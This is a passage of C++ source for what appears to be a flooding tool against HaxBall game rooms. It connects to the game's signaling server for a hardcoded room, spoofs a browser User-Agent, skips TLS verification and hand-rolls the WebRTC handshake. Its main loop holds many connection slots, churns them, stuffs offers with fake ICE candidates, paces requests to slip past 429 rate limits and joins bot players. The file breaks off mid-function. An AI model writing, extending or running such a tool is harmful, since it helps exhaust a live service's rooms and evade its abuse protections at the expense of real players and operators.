#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/ec.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <openssl/srtp.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>
#include <zlib.h>

#include <algorithm>
#include <atomic>
#include <cctype>
#include <cerrno>
#include <chrono>
#include <condition_variable>
#include <csignal>
#include <cstdarg>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

using Clock = std::chrono::steady_clock;
using namespace std::chrono_literals;

static const char* SIGNAL_HOST = "p2p2.haxball.com";
static const int   SIGNAL_PORT = 443;
static std::string ROOM = "AMb-u9r7oNI";

enum { T_READY = 0x00, T_OFFER = 0x01, T_PING = 0x02 };
enum { R_ANSWER = 0x01, R_CAND = 0x04 };

static std::atomic<bool>  g_stop{false};
static std::atomic<long>  g_hs_ok{0}, g_hs_bad{0}, g_sig_ok{0}, g_sig_bad{0};
static std::atomic<long>  g_429{0}, g_503{0}, g_reject{0}, g_churn{0};
static std::atomic<long>  g_open{0}, g_joined{0}, g_stun_ok{0};
static std::atomic<long>  g_tx{0}, g_rx{0};
static std::atomic<int>   g_live{0}, g_pending{0};
static std::atomic<bool>  g_debug{false};
static std::atomic<long long> g_penaltyUntil{0};
static std::atomic<long long> g_last429{0};
static std::atomic<int>   g_429streak{0};

static int  SLOTS = 24, HOLD_MS = 60000, VERSION = 9, MAX_CAND = 2, PORTS = 2;
static int  CAND_FLOOD = 24, CHURN = 0, PING_MS = 1000, RATE = 6, BURST = 8, TTL = 120;
static int  PING_OP = -1, KA_MS = 2000;
static long COUNT = 0;
static bool ONCE = false, QUIET = false, PROBE = false, JOIN = false;
static std::string TOKEN, MANUAL_HOST, PASSWORD, SDP_OUT, OFFER_HEX, MODE = "full";
static std::string NICK = "bot", AVATAR = "", COUNTRY = "xx", PONG_HEX, REAL_CAND;
static std::vector<uint8_t> g_pong;
static std::mutex g_logm;

static long long nowMs() {
    return (long long)std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
}

static void logline(const char* fmt, ...) {
    char b[512]; va_list a; va_start(a, fmt);
    vsnprintf(b, sizeof b, fmt, a); va_end(a);
    std::lock_guard<std::mutex> l(g_logm);
    printf("%s\n", b); fflush(stdout);
}
static void dbg(const char* fmt, ...) {
    if (!g_debug) return;
    char b[512]; va_list a; va_start(a, fmt);
    vsnprintf(b, sizeof b, fmt, a); va_end(a);
    std::lock_guard<std::mutex> l(g_logm);
    printf("%s\n", b); fflush(stdout);
}

static uint16_t be16(const uint8_t* p) { return (uint16_t)((p[0] << 8) | p[1]); }
static uint32_t be32(const uint8_t* p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3];
}
static void push32(std::vector<uint8_t>& v, uint32_t x) {
    v.push_back((uint8_t)(x >> 24)); v.push_back((uint8_t)(x >> 16));
    v.push_back((uint8_t)(x >> 8));  v.push_back((uint8_t)x);
}

static std::string hexDump(const std::vector<uint8_t>& v, size_t max) {
    std::string h;
    for (size_t i = 0; i < v.size() && i < max; i++) {
        char b[4]; snprintf(b, sizeof b, "%02x ", v[i]); h += b;
    }
    if (v.size() > max) h += "...";
    return h;
}
static std::string fullHex(const std::vector<uint8_t>& v) {
    std::string h; char b[4];
    for (uint8_t c : v) { snprintf(b, sizeof b, "%02x", c); h += b; }
    return h;
}
static void dumpFile(const char* path, const std::string& s) {
    FILE* f = fopen(path, "wb");
    if (f) { fwrite(s.data(), 1, s.size(), f); fclose(f); }
}
static std::vector<uint8_t> unhex(const std::string& s) {
    std::vector<uint8_t> v; int hi = -1;
    for (char c : s) {
        int d = (c >= '0' && c <= '9') ? c - '0'
              : (c >= 'a' && c <= 'f') ? c - 'a' + 10
              : (c >= 'A' && c <= 'F') ? c - 'A' + 10 : -1;
        if (d < 0) continue;
        if (hi < 0) hi = d; else { v.push_back((uint8_t)((hi << 4) | d)); hi = -1; }
    }
    return v;
}
static const char* codeName(int c) {
    switch (c) {
        case 4100: return "room full";
        case 4101: return "wrong password";
        case 4102: return "banned";
        case 4103: return "incompatible version";
        case 4104: return "too many pending offers";
        default:   return "?";
    }
}

struct Pacer {
    std::mutex m;
    std::condition_variable cv;
    double tokens = 0;
    long long last = 0;
    double rate = 1;

    void start(int perSec, int burst) {
        std::lock_guard<std::mutex> l(m);
        rate = perSec > 0 ? perSec : 1;
        tokens = burst > 0 ? burst : rate;
        last = nowMs();
    }
    void acquire() {
        std::unique_lock<std::mutex> l(m);
        for (;;) {
            long long n = nowMs();
            tokens = std::min<double>(tokens + (n - last) * rate / 1000.0, rate * 4 + 8);
            last = n;
            if (tokens >= 1) { tokens -= 1; return; }
            cv.wait_for(l, std::chrono::milliseconds((long long)(1000 / rate) + 5));
        }
    }
    void drain() {
        std::lock_guard<std::mutex> l(m);
        tokens = 0;
    }
};
static Pacer g_pacer;

static void penaltyWait() {
    if (nowMs() - g_last429.load() > 30000) g_penaltyUntil.store(0);
    for (;;) {
        long long u = g_penaltyUntil.load(), n = nowMs();
        if (n >= u || g_stop) return;
        std::this_thread::sleep_for(std::chrono::milliseconds(std::min<long long>(u - n, 300)));
    }
}
static void penaltyBump() {
    int s = g_429streak.fetch_add(1) + 1;
    if (s > 6) s = 6;
    long long until = nowMs() + (3000LL << s);
    if (until > nowMs() + 90000) until = nowMs() + 90000;
    long long cur = g_penaltyUntil.load();
    while (until > cur && !g_penaltyUntil.compare_exchange_weak(cur, until)) {}
    g_pacer.drain();
}
static void penaltyRelax() {
    int s = g_429streak.load();
    if (s > 0) g_429streak.store(s - 1);
    if (s <= 1) g_penaltyUntil.store(0);
}

static void putVarint(std::vector<uint8_t>& v, uint32_t x) {
    do { uint8_t b = x & 0x7f; x >>= 7; if (x) b |= 0x80; v.push_back(b); } while (x);
}
static void putStr(std::vector<uint8_t>& v, const std::string& s) {
    putVarint(v, (uint32_t)s.size());
    v.insert(v.end(), s.begin(), s.end());
}
static void putPwd(std::vector<uint8_t>& v, const std::string& s) {
    if (s.empty()) { putVarint(v, 0); return; }
    putVarint(v, (uint32_t)s.size() + 1);
    v.insert(v.end(), s.begin(), s.end());
}
static void putBE16(std::vector<uint8_t>& v, uint16_t x) {
    v.push_back(x >> 8); v.push_back(x & 0xff);
}
static bool getVarint(const uint8_t* p, size_t n, size_t& off, uint32_t& out) {
    uint32_t r = 0; int shift = 0; uint8_t b;
    do {
        if (off >= n || shift > 28) return false;
        b = p[off++];
        r |= (uint32_t)(b & 0x7f) << shift;
        shift += 7;
    } while (b & 0x80);
    out = r;
    return true;
}
static std::vector<uint8_t> deflateRaw(const std::vector<uint8_t>& in) {
    z_stream z{}; deflateInit2(&z, Z_DEFAULT_COMPRESSION, Z_DEFLATED, -15, 8, Z_DEFAULT_STRATEGY);
    std::vector<uint8_t> out(in.size() + 128);
    z.next_in = (Bytef*)in.data(); z.avail_in = in.size();
    z.next_out = out.data();       z.avail_out = out.size();
    deflate(&z, Z_FINISH);
    out.resize(out.size() - z.avail_out);
    deflateEnd(&z);
    return out;
}
static bool inflateRaw(const uint8_t* in, size_t n, std::string& out) {
    z_stream z{}; if (inflateInit2(&z, -15) != Z_OK) return false;
    std::vector<uint8_t> buf(4096);
    z.next_in = (Bytef*)in; z.avail_in = n;
    int rc;
    do {
        z.next_out = buf.data(); z.avail_out = buf.size();
        rc = inflate(&z, Z_NO_FLUSH);
        if (rc != Z_OK && rc != Z_STREAM_END) { inflateEnd(&z); return false; }
        out.append((char*)buf.data(), buf.size() - z.avail_out);
        if (out.size() > (1u << 20)) break;
    } while (rc != Z_STREAM_END);
    inflateEnd(&z);
    return !out.empty();
}

static bool readFull(SSL* s, uint8_t* p, size_t n) {
    size_t got = 0;
    while (got < n) {
        int r = SSL_read(s, p + got, (int)(n - got));
        if (r <= 0) return false;
        got += (size_t)r;
    }
    return true;
}

struct Ws {
    int fd = -1; SSL_CTX* ctx = nullptr; SSL* ssl = nullptr;

    int openOnce(const std::string& path) {
        ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

        addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(SIGNAL_HOST, "443", &hints, &res) != 0 || !res) return 2;

        for (addrinfo* ai = res; ai; ai = ai->ai_next) {
            fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;
            int one = 1;
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof one);
            timeval tv{10, 0};
            setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
            setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
            if (connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
            ::close(fd); fd = -1;
        }
        freeaddrinfo(res);
        if (fd < 0) return 2;

        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, fd);
        SSL_set_tlsext_host_name(ssl, SIGNAL_HOST);
        if (SSL_connect(ssl) != 1) return 2;

        uint8_t key[16]; RAND_bytes(key, sizeof key);
        char b64[32]; EVP_EncodeBlock((unsigned char*)b64, key, sizeof key);
        std::string req =
            "GET " + path + " HTTP/1.1\r\n"
            "Host: " + std::string(SIGNAL_HOST) + "\r\n"
            "Upgrade: websocket\r\nConnection: Upgrade\r\n"
            "Sec-WebSocket-Key: " + b64 + "\r\nSec-WebSocket-Version: 13\r\n"
            "Origin: https://www.haxball.com\r\nAccept: */*\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\r\n\r\n";
        if (SSL_write(ssl, req.data(), (int)req.size()) <= 0) return 2;

        std::string resp; char c;
        while (resp.size() < 4096) {
            if (SSL_read(ssl, &c, 1) <= 0) return 2;
            resp += c;
            if (resp.size() >= 4 && resp.compare(resp.size() - 4, 4, "\r\n\r\n") == 0) break;
        }
        size_t e = resp.find("\r\n");
        dbg("ws: %s", resp.substr(0, e).c_str());
        if (resp.rfind("HTTP/1.1 101", 0) == 0) return 0;
        if (resp.find(" 429") != std::string::npos) return 3;
        if (resp.find(" 503") != std::string::npos) return 1;
        return 2;
    }

    bool open(const std::string& path) {
        for (int i = 0; i < 3; i++) {
            if (g_stop) return false;
            g_pacer.acquire();
            penaltyWait();
            if (g_stop) return false;
            int r = openOnce(path);
            if (r == 0) { penaltyRelax(); return true; }
            close();
            if (r == 3) {
                g_429++;
                g_last429 = nowMs();
                penaltyBump();
                std::this_thread::sleep_for(std::chrono::milliseconds(200 + rand() % 400));
            } else if (r == 1) {
                g_503++;
                std::this_thread::sleep_for(std::chrono::milliseconds(800 + rand() % 1200));
            } else {
                std::this_thread::sleep_for(std::chrono::milliseconds(300 + 400 * i + rand() % 300));
            }
        }
        return false;
    }

    bool sendFrame(uint8_t op, const std::vector<uint8_t>& p) {
        std::vector<uint8_t> f{(uint8_t)(0x80 | (op & 0x0f))};
        uint8_t mask[4]; RAND_bytes(mask, 4);
        if (p.size() < 126) f.push_back(0x80 | (uint8_t)p.size());
        else if (p.size() < 65536) {
            f.push_back(0x80 | 126);
            f.push_back((uint8_t)(p.size() >> 8)); f.push_back((uint8_t)(p.size() & 0xff));
        } else {
            f.push_back(0x80 | 127);
            for (int i = 7; i >= 0; i--) f.push_back((uint8_t)((p.size() >> (8 * i)) & 0xff));
        }
        f.insert(f.end(), mask, mask + 4);
        for (size_t i = 0; i < p.size(); i++) f.push_back(p[i] ^ mask[i & 3]);
        return SSL_write(ssl, f.data(), (int)f.size()) > 0;
    }
    bool sendBinary(const std::vector<uint8_t>& p) { return sendFrame(0x2, p); }

    int recvFrame(std::vector<uint8_t>& out) {
        out.clear();
        int firstOp = -2;
        for (;;) {
            uint8_t h[2];
            if (!readFull(ssl, h, 2)) return -1;
            int op = h[0] & 0x0f;
            uint64_t len = h[1] & 0x7f;
            if (len == 126) { uint8_t b[2]; if (!readFull(ssl, b, 2)) return -1; len = ((uint64_t)b[0] << 8) | b[1]; }
            else if (len == 127) { uint8_t b[8]; if (!readFull(ssl, b, 8)) return -1; len = 0; for (int i = 0; i < 8; i++) len = (len << 8) | b[i]; }
            if (len > (1u << 21)) return -1;
            std::vector<uint8_t> payload(len);
            if (len && !readFull(ssl, payload.data(), (size_t)len)) return -1;
            if (op == 0x9) { sendFrame(0xA, payload); continue; }
            if (op == 0xA) continue;
            if (firstOp == -2) firstOp = op;
            out.insert(out.end(), payload.begin(), payload.end());
            if ((h[0] & 0x80) || op == 0x8) return firstOp;
        }
    }

    void poll() {
        if (fd < 0) return;
        fd_set rf; FD_ZERO(&rf); FD_SET(fd, &rf);
        timeval tv{0, 0};
        if (select(fd + 1, &rf, nullptr, nullptr, &tv) <= 0) return;
        std::vector<uint8_t> pl;
        if (recvFrame(pl) < 0) close();
    }

    void close() {
        if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); ssl = nullptr; }
        if (fd >= 0) { ::close(fd); fd = -1; }
        if (ctx) { SSL_CTX_free(ctx); ctx = nullptr; }
    }
};

static EVP_PKEY* g_key = nullptr;
static X509*     g_cert = nullptr;
static std::string g_fp;

static void makeCert() {
    EVP_PKEY_CTX* kc = EVP_PKEY_CTX_new_id(EVP_PKEY_EC, nullptr);
    EVP_PKEY_keygen_init(kc);
    EVP_PKEY_CTX_set_ec_paramgen_curve_nid(kc, NID_X9_62_prime256v1);
    EVP_PKEY_keygen(kc, &g_key);
    EVP_PKEY_CTX_free(kc);

    g_cert = X509_new();
    X509_set_version(g_cert, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(g_cert), 1);
    X509_gmtime_adj(X509_getm_notBefore(g_cert), 0);
    X509_gmtime_adj(X509_getm_notAfter(g_cert), 86400);
    X509_set_pubkey(g_cert, g_key);
    X509_NAME* n = X509_get_subject_name(g_cert);
    X509_NAME_add_entry_by_txt(n, "CN", MBSTRING_ASC, (const unsigned char*)"haxhalf", -1, -1, 0);
    X509_set_issuer_name(g_cert, n);
    X509_sign(g_cert, g_key, EVP_sha256());

    unsigned char* der = nullptr;
    int dl = i2d_X509(g_cert, &der);
    unsigned char md[32]; unsigned int ml = 32;
    EVP_Digest(der, dl, md, &ml, EVP_sha256(), nullptr);
    OPENSSL_free(der);
    char b[4];
    for (int i = 0; i < 32; i++) { snprintf(b, sizeof b, i ? ":%02X" : "%02X", md[i]); g_fp += b; }
}

static const uint8_t STUN_MAGIC[4] = {0x21, 0x12, 0xA4, 0x42};

struct Creds { std::string lu, lp, ru, rp; };

static bool isStun(const uint8_t* p, size_t n) {
    if (n < 20) return false;
    if (p[0] & 0xc0) return false;
    if (p[0] != 0x00 && p[0] != 0x01) return false;
    return memcmp(p + 4, STUN_MAGIC, 4) == 0;
}

static void stunAttr(std::vector<uint8_t>& p, uint16_t t, const void* d, size_t n) {
    p.push_back((uint8_t)(t >> 8)); p.push_back((uint8_t)(t & 0xff));
    p.push_back((uint8_t)(n >> 8)); p.push_back((uint8_t)(n & 0xff));
    if (n && d) {
        const uint8_t* b = (const uint8_t*)d;
        p.insert(p.end(), b, b + n);
    }
    while (p.size() & 3) p.push_back(0);
}
static void stunLen(std::vector<uint8_t>& p, size_t l) {
    p[2] = (uint8_t)(l >> 8); p[3] = (uint8_t)(l & 0xff);
}
static const uint8_t* stunFind(const uint8_t* p, size_t n, uint16_t type, size_t& outLen) {
    if (n < 20) return nullptr;
    size_t off = 20;
    while (off + 4 <= n) {
        uint16_t t = be16(p + off), l = be16(p + off + 2);
        if (off + 4 + l > n) return nullptr;
        if (t == type) { outLen = l; return p + off + 4; }
        off += 4 + ((l + 3) & ~3u);
    }
    return nullptr;
}

static std::vector<uint8_t> stunRequest(const Creds& c) {
    std::vector<uint8_t> p{0x00, 0x01, 0x00, 0x00};
    p.insert(p.end(), STUN_MAGIC, STUN_MAGIC + 4);
    uint8_t tid[12]; RAND_bytes(tid, 12);
    p.insert(p.end(), tid, tid + 12);

    std::string user = c.ru + ":" + c.lu;
    stunAttr(p, 0x0006, user.data(), user.size());
    uint32_t pri = htonl(0x6E0000FF); stunAttr(p, 0x0024, &pri, 4);
    uint8_t tie[8]; RAND_bytes(tie, 8); stunAttr(p, 0x8029, tie, 8);
    stunAttr(p, 0x0025, nullptr, 0);

    size_t body = p.size() - 20;
    stunLen(p, body + 24);
    unsigned int hl = 20; unsigned char mac[20];
    HMAC(EVP_sha1(), c.rp.data(), (int)c.rp.size(), p.data(), p.size(), mac, &hl);
    stunAttr(p, 0x0008, mac, 20);

    stunLen(p, body + 32);
    uint32_t crc = (uint32_t)crc32(0, p.data(), (uInt)p.size()) ^ 0x5354554E;
    crc = htonl(crc);
    stunAttr(p, 0x8028, &crc, 4);
    stunLen(p, body + 32);
    return p;
}

static void stunRespond(int fd, const sockaddr_in& from, const uint8_t* req, size_t n,
                        const Creds& c) {
    if (n < 20) return;
    std::vector<uint8_t> p{0x01, 0x01, 0x00, 0x00};
    p.insert(p.end(), req + 4, req + 8);
    p.insert(p.end(), req + 8, req + 20);

    size_t ul = 0;
    const uint8_t* un = stunFind(req, n, 0x0006, ul);
    if (un && ul) stunAttr(p, 0x0006, un, ul);

    uint8_t xa[8];
    xa[0] = 0x00; xa[1] = 0x01;
    uint16_t xp = from.sin_port ^ 0x2112;
    memcpy(xa + 2, &xp, 2);
    uint32_t ia = from.sin_addr.s_addr ^ 0x2112A442u;
    memcpy(xa + 4, &ia, 4);
    stunAttr(p, 0x0020, xa, 8);

    size_t body = p.size() - 20;
    stunLen(p, body + 24);
    unsigned int hl = 20; unsigned char mac[20];
    HMAC(EVP_sha1(), c.lp.data(), (int)c.lp.size(), p.data(), p.size(), mac, &hl);
    stunAttr(p, 0x0008, mac, 20);

    stunLen(p, body + 32);
    uint32_t crc = (uint32_t)crc32(0, p.data(), (uInt)p.size()) ^ 0x5354554E;
    crc = htonl(crc);
    stunAttr(p, 0x8028, &crc, 4);
    stunLen(p, body + 32);
    sendto(fd, p.data(), p.size(), 0, (const sockaddr*)&from, sizeof from);
}

static uint32_t g_crc32c[256];
static void crc32cInit() {
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int k = 0; k < 8; k++) c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
        g_crc32c[i] = c;
    }
}
static uint32_t crc32c(const uint8_t* p, size_t n) {
    uint32_t c = 0xFFFFFFFFu;
    for (size_t i = 0; i < n; i++) c = g_crc32c[(c ^ p[i]) & 0xFF] ^ (c >> 8);
    return ~c;
}

static SSL_CTX* g_dtls = nullptr;

enum { D_IDLE = 0, D_HS = 1, D_HOLD = 2, D_DEAD = 3 };

struct Dtls {
    int fd = -1;
    SSL* ssl = nullptr;
    BIO* rbio = nullptr; BIO* wbio = nullptr;
    sockaddr_in peer{};
    Creds cr;
    bool asClient = true;
    int state = D_IDLE, cycles = 0;
    long long hsDeadline = 0, holdUntil = 0, retryAt = 0, lastKa = 0, lastHb = 0;
    uint32_t myTag = 0, peerTag = 0;
    uint16_t lport = 0, rport = 0;
    bool open = false, initSent = false;
    long long initAt = 0; int initTries = 0;

    void sendRaw(const uint8_t* p, size_t n) {
        if (fd >= 0) { send(fd, p, n, 0); g_tx += (long)n; }
    }
    void sendVec(const std::vector<uint8_t>& v) { sendRaw(v.data(), v.size()); }

    void flush() {
        if (!wbio) return;
        uint8_t b[2048];
        for (;;) {
            int n = BIO_read(wbio, b, sizeof b);
            if (n <= 0) break;
            sendRaw(b, (size_t)n);
        }
    }

    void sendDtls(const std::vector<uint8_t>& v) {
        if (!ssl) return;
        for (int i = 0; i < 8; i++) {
            int n = SSL_write(ssl, v.data(), (int)v.size());
            flush();
            if (n == (int)v.size()) return;
            int e = SSL_get_error(ssl, n);
            if (e != SSL_ERROR_WANT_WRITE && e != SSL_ERROR_WANT_READ) return;
            pump();
        }
    }

    void sctpChunk(uint8_t type, const std::vector<uint8_t>& body) {
        std::vector<uint8_t> p;
        uint16_t sp = lport ? lport : 5000, dp = rport ? rport : 5000;
        p.push_back((uint8_t)(sp >> 8)); p.push_back((uint8_t)(sp & 0xff));
        p.push_back((uint8_t)(dp >> 8)); p.push_back((uint8_t)(dp & 0xff));

        uint32_t vt = (type == 1) ? 0u : (type == 2) ? myTag : peerTag;
        push32(p, vt);
        p.push_back(0); p.push_back(0); p.push_back(0); p.push_back(0);
        p.push_back(type); p.push_back(0);
        uint16_t len = (uint16_t)(4 + body.size());
        p.push_back((uint8_t)(len >> 8)); p.push_back((uint8_t)(len & 0xff));
        p.insert(p.end(), body.begin(), body.end());
        while (p.size() & 3) p.push_back(0);
        uint32_t c = crc32c(p.data(), p.size());
        p[8] = (uint8_t)(c & 0xff); p[9] = (uint8_t)((c >> 8) & 0xff);
        p[10] = (uint8_t)((c >> 16) & 0xff); p[11] = (uint8_t)((c >> 24) & 0xff);
        sendDtls(p);
    }

    void sendInit() {
        std::vector<uint8_t> b;
        push32(b, myTag);
        push32(b, 262144);
        b.push_back(0); b.push_back(10);
        b.push_back(0); b.push_back(10);
        push32(b, (uint32_t)rand());
        b.push_back(0x00); b.push_back(0x0b); b.push_back(0x00); b.push_back(0x08);
        push32(b, 0);
        sctpChunk(1, b);
        initSent = true; initAt = nowMs(); initTries++;
    }

    void markOpen() {
        if (open) return;
        open = true; g_open++;
        if (JOIN) {
            std::vector<uint8_t> f;
            f.push_back(0x01);
            putStr(f, "{\"name\":\"" + NICK + "\",\"avatar\":\"" + AVATAR +
                      "\",\"country\":\"" + COUNTRY + "\"}");
            putPwd(f, PASSWORD);
            sendDtls(f);
            g_joined++;
        }
    }

    void sctpHandle(const uint8_t* p, size_t n) {
        if (n < 12) return;
        if (!lport) { lport = be16(p + 2); rport = be16(p); }
        size_t off = 12;
        while (off + 4 <= n) {
            uint8_t t = p[off];
            uint16_t cl = be16(p + off + 2);
            if (cl < 4 || off + cl > n) break;
            const uint8_t* c = p + off;
            switch (t) {
            case 1: {
                if (cl < 20) break;
                peerTag = be32(c + 4);
                myTag = (uint32_t)rand() * 2654435761u;
                if (!myTag) myTag = 1;
                std::vector<uint8_t> b;
                push32(b, myTag);
                push32(b, 262144);
                b.push_back(c[14]); b.push_back(c[15]);
                b.push_back(c[12]); b.push_back(c[13]);
                push32(b, (uint32_t)rand());
                b.push_back(0x00); b.push_back(0x07); b.push_back(0x00); b.push_back(0x0c);
                for (int i = 4; i < 12; i++) b.push_back(c[i]);
                sctpChunk(2, b);
                break;
            }
            case 2: {
                if (cl < 20) break;
                peerTag = be32(c + 4);
                std::vector<uint8_t> b;
                size_t po = 20;
                while (po + 4 <= cl) {
                    uint16_t pt = be16(c + po), pl = be16(c + po + 2);
                    if (pl < 4 || po + pl > cl) break;
                    if (pt == 0x0007) b.insert(b.end(), c + po, c + po + pl);
                    po += (pl + 3) & ~3u;
                }
                sctpChunk(10, b);
                break;
            }
            case 10:
                sctpChunk(11, {});
                markOpen();
                break;
            case 11:
                markOpen();
                break;
            case 0:
                if (cl >= 16) {
                    std::vector<uint8_t> b;
                    push32(b, be32(c + 4));
                    push32(b, 262144);
                    b.push_back(0); b.push_back(0); b.push_back(0); b.push_back(0);
                    sctpChunk(3, b);
                }
                break;
            case 4: {
                std::vector<uint8_t> b(c + 4, c + cl);
                sctpChunk(5, b);
                break;
            }
            case 6:
                state = D_DEAD; retryAt = nowMs();
                break;
            case 7:
                sctpChunk(8, {});
                break;
            default:
                break;
            }
            off += (cl + 3) & ~3u;
        }
    }

    void pump() {
        uint8_t buf[2048];
        for (;;) {
            sockaddr_in from{}; socklen_t fl = sizeof from;
            ssize_t n = recvfrom(fd, buf, sizeof buf, MSG_DONTWAIT, (sockaddr*)&from, &fl);
            if (n <= 0) break;
            g_rx += (long)n;
            if (isStun(buf, (size_t)n)) {
                if (buf[1] == 0x01) {
                    if (buf[0] == 0x00) stunRespond(fd, from, buf, (size_t)n, cr);
                    else                g_stun_ok++;
                }
                continue;
            }
            BIO_write(rbio, buf, (int)n);
        }
    }

    void drainApp() {
        uint8_t buf[2048];
        for (;;) {
            int n = SSL_read(ssl, buf, sizeof buf);
            if (n <= 0) break;
            if (PING_OP >= 0 && buf[0] == (uint8_t)PING_OP && !g_pong.empty())
                sendDtls(g_pong);
            sctpHandle(buf, (size_t)n);
        }
        flush();
    }

    void die(long long retry) {
        if (state == D_HOLD) g_live--;
        if (open) { g_open--; open = false; }
        state = D_DEAD; retryAt = retry;
    }

    void closeAll() {
        if (state == D_HOLD) g_live--;
        if (open) { g_open--; open = false; }
        if (ssl) { SSL_free(ssl); ssl = nullptr; rbio = wbio = nullptr; }
        if (fd >= 0) { ::close(fd); fd = -1; }
        state = D_IDLE;
    }

    bool begin(int hsMs) {
        closeAll();
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) { state = D_DEAD; return false; }
        int buf = 1 << 20;
        setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &buf, sizeof buf);
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof buf);
        sockaddr_in local{}; local.sin_family = AF_INET; local.sin_addr.s_addr = INADDR_ANY;
        bind(fd, (sockaddr*)&local, sizeof local);
        connect(fd, (sockaddr*)&peer, sizeof peer);

        myTag = (uint32_t)rand() * 2654435761u;
        if (!myTag) myTag = 1;
        peerTag = 0; lport = rport = 0;
        open = false; initSent = false; initTries = 0;

        ssl = SSL_new(g_dtls);
        rbio = BIO_new(BIO_s_mem());
        wbio = BIO_new(BIO_s_mem());
        SSL_set_bio(ssl, rbio, wbio);
        SSL_set_mtu(ssl, 1200);
        SSL_set_options(ssl, SSL_OP_NO_QUERY_MTU);
        if (asClient) SSL_set_connect_state(ssl);
        else          SSL_set_accept_state(ssl);

        for (int i = 0; i < 3; i++) sendVec(stunRequest(cr));
        state = D_HS;
        hsDeadline = nowMs() + hsMs;
        cycles++;
        g_churn++;
        return true;
    }

    void step(long long now, int hsMs) {
        if (state == D_HS) {
            pump();
            int r = SSL_do_handshake(ssl);
            flush();
            if (r == 1) {
                g_hs_ok++;
                g_live++;
                state = D_HOLD;
                holdUntil = now + (JOIN ? 15000 + rand() % 15000 : 2000 + rand() % 4000);
                lastKa = now; lastHb = now;
                if (asClient) sendInit();
                return;
            }
            int e = SSL_get_error(ssl, r);
            if (e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE) {
                DTLSv1_handle_timeout(ssl);
                flush();
                if (now > hsDeadline) { g_hs_bad++; die(now + 120 + rand() % 300); }
                return;
            }
            g_hs_bad++;
            die(now + 120 + rand() % 300);
            return;
        }
        if (state == D_HOLD) {
            pump();
            drainApp();
            DTLSv1_handle_timeout(ssl);
            flush();
            if (asClient && initSent && !open && initTries < 4 && now - initAt > 1000)
                sendInit();
            if (now - lastKa > KA_MS) { lastKa = now; sendVec(stunRequest(cr)); }
            if (open && now - lastHb > 10000) {
                lastHb = now;
                std::vector<uint8_t> b{0x00, 0x01, 0x00, 0x08};
                push32(b, (uint32_t)rand());
                sctpChunk(4, b);
            }
            if (now > holdUntil) die(now);
        }
    }
};

static const char* CAND_POOL[] = { "192.0.2.", "198.51.100.", "203.0.113." };

static std::string makeSdp(const std::string& ufrag, const std::string& pwd) {
    char sess[24];
    snprintf(sess, sizeof sess, "%u", (unsigned)(rand() * 65537u + rand()));
    std::string s =
        "v=0\r\n"
        "o=- " + std::string(sess) + " 2 IN IP4 127.0.0.1\r\n"
        "s=-\r\n"
        "t=0 0\r\n"
        "a=group:BUNDLE 0\r\n"
        "a=extmap-allow-mixed\r\n"
        "a=msid-semantic: WMS\r\n"
        "m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n"
        "c=IN IP4 0.0.0.0\r\n"
        "a=ice-ufrag:" + ufrag + "\r\n"
        "a=ice-pwd:" + pwd + "\r\n"
        "a=ice-options:trickle\r\n"
        "a=fingerprint:sha-256 " + g_fp + "\r\n"
        "a=setup:actpass\r\n"
        "a=mid:0\r\n"
        "a=sctp-port:5000\r\n"
        "a=max-message-size:262144\r\n";

    int idx = 0;
    if (!REAL_CAND.empty()) {
        auto c = REAL_CAND.find(':');
        if (c != std::string::npos) {
            char line[160];
            snprintf(line, sizeof line,
                     "a=candidate:0 1 udp 2130706431 %s %s typ srflx raddr 0.0.0.0 rport 0 generation 0\r\n",
                     REAL_CAND.substr(0, c).c_str(), REAL_CAND.substr(c + 1).c_str());
            s += line;
            idx = 1;
        }
    }
    for (int i = 0; i < CAND_FLOOD; i++) {
        char line[128];
        snprintf(line, sizeof line, "a=candidate:%d 1 udp %u %s%d %d typ host generation 0\r\n",
                 idx + i + 1, 2130706431u - (unsigned)i * 1024u,
                 CAND_POOL[i % 3], 1 + rand() % 254, 1024 + rand() % 64000);
        s += line;
    }
    s += "a=end-of-candidates\r\n";
    return s;
}

struct Host { std::string ip; int port; int rank; int prio; };

static bool ieq(const std::string& a, const char* b) {
    size_t n = strlen(b);
    if (a.size() != n) return false;
    for (size_t i = 0; i < n; i++)
        if (tolower((unsigned char)a[i]) != tolower((unsigned char)b[i])) return false;
    return true;
}

static bool isPrivate(const std::string& ip) {
    in_addr a{};
    if (inet_pton(AF_INET, ip.c_str(), &a) != 1) return true;
    uint32_t v = ntohl(a.s_addr);
    if ((v >> 24) == 10) return true;
    if ((v >> 20) == 0xAC1) return true;
